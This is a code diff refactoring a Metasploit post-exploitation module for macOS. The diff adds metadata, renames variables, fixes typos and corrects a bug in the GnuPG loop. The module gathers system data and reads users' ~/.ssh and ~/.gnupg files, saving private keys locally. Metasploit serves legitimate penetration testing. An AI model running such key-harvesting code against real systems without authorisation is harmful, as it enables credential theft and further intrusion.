@@ -20,12 +20,16 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
         'Platform' => [ 'osx' ],
-        'SessionTypes' => [ 'meterpreter', 'shell' ]
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [ARTIFACTS_ON_DISK],
+          'Reliability' => []
+        }
       )
     )
   end
 
-  # Run Method for when run command is issued
   def run
     case session.type
     when /meterpreter/
@@ -145,9 +149,9 @@ class MetasploitModule < Msf::Post
     print_status("Saving all data to #{log_folder}")
 
     # Enumerate first using System Profiler
-    profile_datatypes.each do |name, profile_datatypes|
+    profile_datatypes.each do |name, datatypes|
       print_status("\tEnumerating #{name}")
-      returned_data = cmd_exec("/usr/sbin/system_profiler #{profile_datatypes}")
+      returned_data = cmd_exec("/usr/sbin/system_profiler #{datatypes}")
       # Save data lo log folder
       file_local_write(log_folder + "//#{name}.txt", returned_data)
     end
@@ -196,14 +200,14 @@ class MetasploitModule < Msf::Post
     # Run commands according to the session type
     if session.type =~ /shell/
 
-      # Enumerate and retreave files according to privilege level
+      # Enumerate and retrieve files according to privilege level
       if !is_root?
 
         # Enumerate the home folder content
         home_folder_list = cmd_exec('/bin/ls -ma ~/').split(', ')
 
         # Check for SSH folder and extract keys if found
-        if home_folder_list.include?("\.ssh")
+        if home_folder_list.include?('.ssh')
           print_status('.ssh Folder is present')
           ssh_folder = cmd_exec('/bin/ls -ma ~/.ssh').split(', ')
           ssh_folder.each do |k|
@@ -218,7 +222,7 @@ class MetasploitModule < Msf::Post
         end
 
         # Check for GPG and extract keys if found
-        if home_folder_list.include?("\.gnupg")
+        if home_folder_list.include?('.gnupg')
           print_status('.gnupg Folder is present')
           gnugpg_folder = cmd_exec('/bin/ls -ma ~/.gnupg').split(', ')
           gnugpg_folder.each do |k|
@@ -242,35 +246,33 @@ class MetasploitModule < Msf::Post
 
         users.each do |u|
           user_folder = cmd_exec("/bin/ls -ma /Users/#{u}/").split(', ')
-          next unless user_folder.include?("\.ssh")
+          if user_folder.include?("\.ssh")
 
-          print_status(".ssh Folder is present for #{u}")
-          ssh_folder = cmd_exec("/bin/ls -ma /Users/#{u}/.ssh").split(', ')
-          ssh_folder.each do |k|
-            next if k =~ /^\.$|^\.\.$/
+            print_status(".ssh Folder is present for #{u}")
+            ssh_folder = cmd_exec("/bin/ls -ma /Users/#{u}/.ssh").split(', ')
+            ssh_folder.each do |k|
+              next if k =~ /^\.$|^\.\.$/
 
-            print_status("\tDownloading #{k.strip}")
-            ssh_file_content = cmd_exec("/bin/cat /Users/#{u}/.ssh/#{k}")
+              print_status("\tDownloading #{k.strip}")
+              ssh_file_content = cmd_exec("/bin/cat /Users/#{u}/.ssh/#{k}")
 
-            # Save data lo log folder
-            file_local_write(log_folder + "//#{k.strip.gsub(/\W/, '_')}", ssh_file_content)
+              # Save data lo log folder
+              file_local_write(log_folder + "//#{k.strip.gsub(/\W/, '_')}", ssh_file_content)
+            end
           end
-        end
 
-        users.each do |u|
-          user_folder = cmd_exec("/bin/ls -ma /Users/#{u}/").split(', ')
-          next unless user_folder.include?("\.ssh")
+          next unless user_folder.include?('.gnupg')
 
           print_status(".gnupg Folder is present for #{u}")
-          ssh_folder = cmd_exec("/bin/ls -ma /Users/#{u}/.gnupg").split(', ')
-          ssh_folder.each do |k|
+          gpg_folder = cmd_exec("/bin/ls -ma /Users/#{u}/.gnupg").split(', ')
+          gpg_folder.each do |k|
             next if k =~ /^\.$|^\.\.$/
 
             print_status("\tDownloading #{k.strip}")
-            ssh_file_content = cmd_exec("/bin/cat /Users/#{u}/.gnupg/#{k}")
+            gpg_file_content = cmd_exec("/bin/cat /Users/#{u}/.gnupg/#{k}")
 
             # Save data lo log folder
-            file_local_write(log_folder + "//#{k.strip.gsub(/\W/, '_')}", ssh_file_content)
+            file_local_write(log_folder + "//#{k.strip.gsub(/\W/, '_')}", gpg_file_content)
           end
         end
       end
